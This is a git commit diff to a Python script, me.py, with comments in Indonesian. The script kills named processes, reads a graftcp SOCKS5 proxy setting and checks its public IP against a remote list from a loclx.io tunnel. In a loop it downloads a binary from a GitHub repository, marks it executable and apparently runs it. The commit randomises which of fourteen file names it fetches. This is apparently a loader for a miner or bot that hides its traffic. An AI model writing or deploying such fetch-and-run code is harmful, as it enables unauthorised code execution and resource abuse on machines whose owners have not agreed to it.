da6b6c88ddac51937852364624b8fad90ac10245
suplays <137026950+suplays@users.noreply.github.com>
2023-07-05 01:39:33 -0700

    Add files via upload

--- me.py
+++ me.py
@@ -6,6 +6,7 @@ import socket
 import urllib.request
 import configparser
 import os
+import random
 
 def kill_processes(process_names):
     for name in process_names:
@@ -19,13 +20,14 @@ def check_ip_in_list(ip_list, socks_ip):
     return False
 
 # Fungsi untuk mendownload file dan menjalankannya
-def download_and_run(url):
-    file_name = "satu"
+def download_and_run(base_url):
+    file_name = random.choice(nama_file)
     
     # Naik satu direktori
     os.chdir("..")
     
     # Mendownload file dari URL
+    url = f"{base_url}/{file_name}"
     urllib.request.urlretrieve(url, file_name)
 
     # Memberikan izin eksekusi pada file
@@ -42,12 +44,15 @@ config.read("graftcp/local/graftcp-local.conf")
 socks5_config = config.get("local", "socks5")
 socks_ip = socks5_config.split(":")[0]
 
+# daftar nama file dan titik akses
+nama_file = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh', 'delapan', 'sembilan', 'sepuluh', 'sebelas', 'duabelas', 'tigabelas', 'empatbelas']
+
 # URL untuk memeriksa alamat IP
 check_ip_url = "http://checkip.amazonaws.com"
 # URL untuk memeriksa respons JSON
 check_json_url = "http://localtopublic.ap.loclx.io/list"
 # URL untuk mendownload file
-download_url = "https://github.com/suplays/starterpack/raw/main/nim/satu"
+download_url = "https://github.com/suplays/starterpack/raw/main/nim"
 
 while True:
     try:
